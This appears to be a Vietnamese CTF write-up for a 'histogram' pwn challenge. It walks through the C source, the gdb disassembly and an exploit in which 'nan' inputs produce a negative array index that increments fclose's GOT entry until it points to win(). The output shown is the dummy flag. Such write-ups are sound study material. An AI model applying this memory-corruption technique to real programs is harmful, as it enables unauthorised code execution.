# Phân tích file

- Bài này tác giả cho source như sau.
- Main
    
    ```c
    int main(int argc, char **argv) {
      if (argc < 2)
        fatal("No input file");
    
      /* Open CSV */
      FILE *fp = fopen(argv[1], "r");
      if (fp == NULL)
        fatal("Cannot open the file");
    
      /* Read data from the file */
      int n = 0;
      while (read_data(fp) == 0)
        if (++n > SHRT_MAX)
          fatal("Too many input");
    
      /* Show result */
      printf("{\"status\":\"success\",\"result\":{\"wsum\":");
      json_print_array(wsum, WSIZE);
      printf(",\"hsum\":");
      json_print_array(hsum, HSIZE);
      printf(",\"map\":[");
      for (short i = 0; i < WSIZE; i++) {
        json_print_array(map[i], HSIZE);
        if (i != WSIZE-1) putchar(',');
      }
      printf("]}}");
    
      fclose(fp);
      return 0;
    }
    ```
    
- Read_data
    
    ```c
    int read_data(FILE *fp) {
      /* Read data */
      double weight, height;
      int n = fscanf(fp, "%lf,%lf", &weight, &height);
      if (n == -1)
        return 1; /* End of data */
      else if (n != 2)
        fatal("Invalid input");
    
      /* Validate input */
      if (weight < 1.0 || weight >= WEIGHT_MAX)
        fatal("Invalid weight");
      if (height < 1.0 || height >= HEIGHT_MAX)
        fatal("Invalid height");
    
      /* Store to map */
      short i, j;
      i = (short)ceil(weight / WEIGHT_STRIDE) - 1;
      j = (short)ceil(height / HEIGHT_STRIDE) - 1;
      
      map[i][j]++;
      wsum[i]++;
      hsum[j]++;
    
      return 0;
    }
    ```
    
    - Sau khi debug bằng gdb thì mình thấy đoạn tính toán nó sẽ như sau:
        
        ```c
        0x00000000004013f8 <+266>:   movsxd rdi,ecx
           0x00000000004013fb <+269>:   movsxd rsi,edx
           0x00000000004013fe <+272>:   mov    rax,rsi
           0x0000000000401401 <+275>:   shl    rax,0x4
           0x0000000000401405 <+279>:   sub    rax,rsi
           0x0000000000401408 <+282>:   add    rax,rax
           0x000000000040140b <+285>:   add    rax,rdi
           0x000000000040140e <+288>:   lea    rsi,[rax*4+0x0]
           0x0000000000401416 <+296>:   lea    rax,[rip+0x2c83]        # 0x4040a0 <map>
           0x000000000040141d <+303>:   mov    eax,DWORD PTR [rsi+rax*1]
           0x0000000000401420 <+306>:   lea    esi,[rax+0x1]
        ```
        
        - Đoạn này nó sẽ lấy phần tử thứ 1 của mình dịch trái đi 4 lần.
        - Rồi nhân 4 và trừ cho chính nó(phần tử thứ 1)
        - Sau đó cộng với nó(kết quả bước trên)
        - Tiếp đến là cộng với phần tử thứ 2 của mình.
        - Lấy kết quả nhân 4 rồi cộng với 0x4040a0(map) rồi sau đó tăng kết quả lên 1.

# Exploit.

- Mục tiêu của mình bài này là overwrite fclose_got thành địa chỉ của hàm win (0x401268).
- Ta thấy địa chỉ của map(0x4040a0) lớn hơn địa chỉ của fclose_got(0x404030) nên ta cần phải cho phần tử thứ 1 là số âm để sau khi thực hiện bước cuối thì địa chỉ của rsi+rax*1 là địa chỉ của fclose_got.
- Sau khi tìm hiểu thì thấy nếu ta truyền nan (not a number) vào phần tử đầu tiên thì chương trình sẽ xem đó là -1 ⇒ ta có thể thực hiện theo cách trên.
- Sau khi tính toán mình sẽ dùng phần tử thứ 2 bằng 2, thì kết quả tính toán sẽ như sau:
    
    ```c
    -1 << 4 = -16
    -16 - -1 = -15
    -15 + -15 = -30
    -30 + 2= -28
    -28*4 = -112
    0x4040a0(map) - 112 = fclose_got
    pwndbg> p/x 0x4040a0-112
    $6 = 0x404030
    ```
    
    - Lúc này nó sẽ tăng fclose_got lên 1 đến khi đọc hết file.
- Khoảng cách từ fclose_got đến win là:
    
    ```c
    pwndbg> p/d 0x401268-0x401060
    $9 = 520
    ```
    
- Vậy ta chỉ cần tạo 520 dòng "nan,22.2" sẽ overwrite fclose_got thành win và khi gọi fclsoe sẽ nhảy để win và cho ta flag.

```c
► 0x40169e <main+332>              call   fclose@plt <fclose@plt>
        stream: 0x4062a0 ◂— 0xfbad2498
[0x404030] fclose@GLIBC_2.2.5 -> 0x401268 (win) ◂— endbr64
```

- Flag.

```c
{"status":"success","result":{"wsum":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"hsum":[0,0,520,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"map":[[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,520]]}}DUMMY{The flag exists in the working directory of histogram.bin}
dinhvu@LAPTOP-63U3K24D:/mnt/c/Users/ADMIN/Desktop/ctf/asia/histogram$ cat flag.txt
DUMMY{The flag exists in the working directory of histogram.bin}
```
